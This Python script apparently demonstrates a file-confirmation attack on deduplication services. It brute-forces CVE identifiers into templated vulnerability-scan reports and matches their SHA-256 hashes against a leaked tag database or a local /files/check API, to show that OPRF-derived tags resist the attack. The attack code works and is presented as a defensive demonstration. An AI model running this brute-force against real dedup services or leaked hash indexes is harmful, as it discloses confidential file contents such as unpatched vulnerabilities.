from __future__ import annotations

import argparse
import hashlib
import http.client
import json
import os
from pathlib import Path
from urllib.parse import urlparse


BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "demo_oprf_data"
VUL_DB_PATH = DATA_DIR / "vul_service_db.json"
SCAN_DATE = "2026-06-06"
DEFAULT_API_BASE_URL = os.getenv("SECURE_DEDUP_API_BASE_URL", "http://localhost:8000")
DEFAULT_YEAR_START = 2024
DEFAULT_YEAR_END = 2026


def canonical_json_bytes(value: dict) -> bytes:
    return json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode(
        "utf-8"
    )


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def vulnerable_tag(report: dict) -> str:
    return sha256_hex(canonical_json_bytes(report))


def build_candidate_report(cve_id: str) -> dict:
    return {
        "report_type": "trivy_security_scan",
        "schema_version": "1.0",
        "company": "FinPay",
        "service": "payment-api",
        "environment": "production",
        "image": "registry.finpay.internal/payment-api:2026.06.06",
        "scanner": "trivy",
        "scan_run_id": "scan-payment-api-prod-20260606-nightly",
        "scan_date": SCAN_DATE,
        "result_type": "critical_vulnerability",
        "target_cve": cve_id,
        "package": "spring-security",
        "installed_version": "6.2.2",
        "fixed_version": "6.2.8",
        "severity": "CRITICAL",
        "internet_facing": True,
        "affected": True,
        "patched_in_production": False,
    }


def iter_cves(year_start: int, year_end: int, number_start: int, number_end: int):
    for year in range(year_start, year_end + 1):
        for number in range(number_start, number_end + 1):
            yield f"CVE-{year}-{number:05d}"


def cve_range_label(args: argparse.Namespace) -> str:
    return (
        f"CVE-{args.year_start}-{args.cve_start:05d}"
        f"..CVE-{args.year_end}-{args.cve_end:05d}"
    )


def load_vulnerable_tag_index() -> dict[str, dict]:
    if not VUL_DB_PATH.exists():
        raise SystemExit(f"Missing {VUL_DB_PATH}. Run: python3 build_log.py")

    leak = json.loads(VUL_DB_PATH.read_text(encoding="utf-8"))
    return {str(row["tag_hex"]): row for row in leak["rows"]}


def attack_vul_service(args: argparse.Namespace) -> int:
    tag_index = load_vulnerable_tag_index()

    print("[vul] leaked tags:", len(tag_index))
    print(f"[vul] brute-forcing {cve_range_label(args)}")

    for attempt, cve_id in enumerate(
        iter_cves(args.year_start, args.year_end, args.cve_start, args.cve_end),
        start=1,
    ):
        candidate = build_candidate_report(cve_id)
        tag_hex = vulnerable_tag(candidate)
        row = tag_index.get(tag_hex)
        if row:
            print("[FOUND] offline brute force succeeded")
            print("[FOUND] attempts:", attempt)
            print("[FOUND] cve:", cve_id)
            print("[FOUND] file_id:", row["file_id"])
            print("[FOUND] object_uri:", row["object_uri"])
            return 0

        if args.progress_every and attempt % args.progress_every == 0:
            print("[vul] attempts:", attempt)

    print("[FAILED] no matching CVE found in vulnerable DB leak")
    return 1


class SecureCheckClient:
    def __init__(self, base_url: str, timeout: float) -> None:
        parsed = urlparse(base_url)
        if parsed.scheme not in {"http", "https"}:
            raise SystemExit(f"Unsupported API URL scheme: {base_url}")
        self.parsed = parsed
        self.timeout = timeout
        self.path = (parsed.path.rstrip("/") if parsed.path else "") + "/files/check"
        port = parsed.port
        host = parsed.hostname
        if not host:
            raise SystemExit(f"Invalid API URL: {base_url}")
        if parsed.scheme == "https":
            self.conn = http.client.HTTPSConnection(host, port=port, timeout=timeout)
        else:
            self.conn = http.client.HTTPConnection(host, port=port, timeout=timeout)

    def close(self) -> None:
        self.conn.close()

    def check_tag(self, tag_hex: str) -> bool:
        body = json.dumps({"tag_hex": tag_hex}).encode("utf-8")
        self.conn.request(
            "POST",
            self.path,
            body=body,
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
        )
        response = self.conn.getresponse()
        payload = response.read()
        if response.status >= 400:
            raise RuntimeError(f"HTTP {response.status}: {payload.decode('utf-8', errors='replace')}")
        data = json.loads(payload.decode("utf-8"))
        return bool(data.get("exists"))


def attack_secure_service(args: argparse.Namespace) -> int:
    print("[secure] target:", args.api_base_url)
    print("[secure] endpoint: POST /files/check")
    print("[secure] attacker strategy: generate vulnerable SHA256 tags offline and query the real service")
    print(f"[secure] brute-forcing {cve_range_label(args)}")

    try:
        client = SecureCheckClient(args.api_base_url, timeout=args.timeout)
    except OSError as exc:
        print("[ERROR] could not initialize secure API client:", exc)
        return 3

    try:
        for attempt, cve_id in enumerate(
            iter_cves(args.year_start, args.year_end, args.cve_start, args.cve_end),
            start=1,
        ):
            candidate = build_candidate_report(cve_id)
            tag_hex = vulnerable_tag(candidate)

            try:
                exists = client.check_tag(tag_hex)
            except OSError as exc:
                print("[ERROR] could not connect to secure API:", exc)
                print("[ERROR] start Docker/API first or pass --api-base-url")
                return 3
            except RuntimeError as exc:
                print("[ERROR] secure API returned an error:", exc)
                return 3

            if exists:
                print("[UNEXPECTED] vulnerable tag matched the secure service")
                print("[UNEXPECTED] attempts:", attempt)
                print("[UNEXPECTED] cve:", cve_id)
                print("[UNEXPECTED] this suggests the service is using raw content hashes as tags")
                return 2

            if args.progress_every and attempt % args.progress_every == 0:
                print("[secure] attempts:", attempt)
    finally:
        client.close()

    print("[BLOCKED] attack failed against secure service")
    print("[BLOCKED] no raw SHA256 candidate tag existed in the real /files/check index")
    print("[BLOCKED] expected reason: secure tags are derived after OPRF/PoW, not from raw scanner logs")
    return 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Demo file-confirmation attack against vulnerable and secure dedup services."
    )
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--vul-service", action="store_true", help="Attack the local vulnerable demo DB leak.")
    mode.add_argument(
        "--secure-sevice",
        "--secure-service",
        dest="secure_service",
        action="store_true",
        help="Attack the running secure dedup API. The misspelled flag is kept for the demo command.",
    )
    parser.add_argument("--api-base-url", default=DEFAULT_API_BASE_URL)
    parser.add_argument("--year-start", type=int, default=DEFAULT_YEAR_START)
    parser.add_argument("--year-end", type=int, default=DEFAULT_YEAR_END)
    parser.add_argument("--cve-start", type=int, default=0)
    parser.add_argument("--cve-end", type=int, default=99999)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--progress-every", type=int, default=10000)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.vul_service:
        return attack_vul_service(args)
    return attack_secure_service(args)


if __name__ == "__main__":
    raise SystemExit(main())
